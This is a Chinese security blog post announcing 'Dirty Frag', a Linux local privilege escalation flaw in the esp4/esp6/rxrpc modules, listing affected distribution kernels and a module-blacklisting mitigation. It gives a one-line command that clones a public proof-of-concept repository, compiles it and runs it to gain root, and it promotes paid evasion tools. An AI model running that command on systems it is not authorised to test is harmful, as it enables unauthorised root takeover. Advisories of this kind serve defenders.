#  Linux LPE通用提权 0day目前没有漏洞编号  
渗透测试
                    渗透测试  渗透测试   2026-05-08 02:31  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EZicQGyMXoOnhZJEBmwx5SK4a4dxiajApAickvHyYW1L2HTOgdVXicfqfDMKscMAvPIkfm9KrpFPWPafPsu7edu8PI4d75BjzlIWAgvibSlQiaHicU/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=d3ftoiiz&watermark=1&tp=wxpic#imgIndex=0 "")  
  
**点击上方蓝字****关注【渗透测试】不迷路**  
  
### 介绍：  
  
漏洞名称：Dirty Frag  
  
发现时间：2026年5月7日  
  
严重程度：  
高危（Critical）  
  
风险描述：本地未授权用户可稳定实现权限提升（LPE）至 root 权限，成功率极高，无需竞争条件，且失败不会引发内核崩溃（panic）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EZicQGyMXoOmwOGJeZ6lbJ4ClXicgf5LDk7XOM56gyeLibFjTicibib4vodEubWqovkwGrCPOibKQOoE5wJeuNM9dFm6GcujVflicAaREWE2XIK0UcI/640?wx_fmt=png&from=appmsg "")  
  
官方仓库 & PoC：  
```
https://github.com/V4bel/dirtyfrag
```  
  
验证方式  
```
git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```  
  
或者  
```
git clone https://github.com/V4bel/dirtyfrag.git
cd dirtyfrag
gcc -O0 -Wall -o exp exp.c -lutil && ./exp
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EZicQGyMXoOmVVicqISiafL21Uuemp2C4vN0KiaghgGoDy4vtLqRIlaH4fVVKK3OUZv21VFNN4icyA6V6iaQuclvudN5jcGulpKrgKgcnz7ny9aOU/640?wx_fmt=png&from=appmsg "")  
  
该 PoC 是在与 Linux 发行版协商后提供准确信息。不要在你未被授权测试的系统上使用它。  
  
受影响版本  
```
Ubuntu 24.04.4: 6.17.0-23-generic
RHEL 10.1: 6.12.0-124.49.1.el10_1.x86_64
openSUSE Tumbleweed: 7.0.2-1-default
CentOS Stream 10: 6.12.0-224.el10.x86_64
AlmaLinux 10: 6.12.0-124.52.3.el10_1.x86_64
Fedora 44: 6.19.14-300.fc44.x86_64
...
```  
  
frm-ESP 页面缓存写入漏洞的影响范围始于提交 cac2661c53f3（2017年1月17日），RxRPC 页面缓存写入漏洞的影响范围始于提交 2dc334f1a63a（2023年6月），两者均持续影响至当前最新上游版本。  
  
换言之，该漏洞在代码中存在时间总计约**9年**  
。  
  
修复方法：  
```
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"
```  
  
🎁POC获取方式  
  
👇关注公众号，后台回复关键词 "  
   
0508   
"获取工具  
👇  
  
```
```  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EZicQGyMXoOk6v7trPVibz4DiawPspGDsSzTQmw8uPG2WmGO5Gv5Cenav1NuEPFhPOhFicQPB6PbA86yEIN2tGdz2ngH0o5Lo7RtDGxXNpFWWiaA/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=3 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EZicQGyMXoOlF6XicicUspIPApmdqCYkxrIAKKXWFiaxljibeg1CF8RcKfpeRQicJrAzia5QMQWeOAeIRMxicfwkBU1Q2ge7ImuUqYicj2s0MWo3YK1E/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&watermark=1&tp=wxpic#imgIndex=6 "")  
  
**星球介绍**  
  
**自研工具、二开工具、免杀工具、漏洞复现、教程等资源、漏洞挖掘分析、网络安全相关资料分享。**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/EZicQGyMXoOntmulls2fl2buJFHORb5xnfxp4enJmZ90yPPspdCNT8a4ur63RDJScVXJhhCHb3es0nwS1dQQKEAmm17mJPTHNlvMbLOBpLJY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=16 "")  
  
严正声明：本工具仅用于合法的安全研究及教学。用户必须对自身行为负责，严格遵守法律。任何将工具用于违法犯罪的行为均被严格禁止，由此工具产生的全部法律责任问题均由用户自行承担一切后果，开发者概不负责。  
## ✅AiScan-N 使用反馈  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/EZicQGyMXoOnpeSNWtU6HkyQhFqdG0mgl5icib15ibWqCnLaWhSjoZ6cmsNvzqKibTpkcb4wAzic1icXOlA5Wwuj0icG0U1whjvTCDWrHw4lHReCLYw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=14 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/EZicQGyMXoOkiaw0Xb3ZjFpMvNgfDanqkPps9yC4PDmeiaXzgpAqrgT7XxfoicdtN0iaqSCzuxo2UX6TY7Sj4ic1iaNxaEyHbZb45l3pmyRgW8BIRQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=wxpic#imgIndex=5 "")  
  
  
  
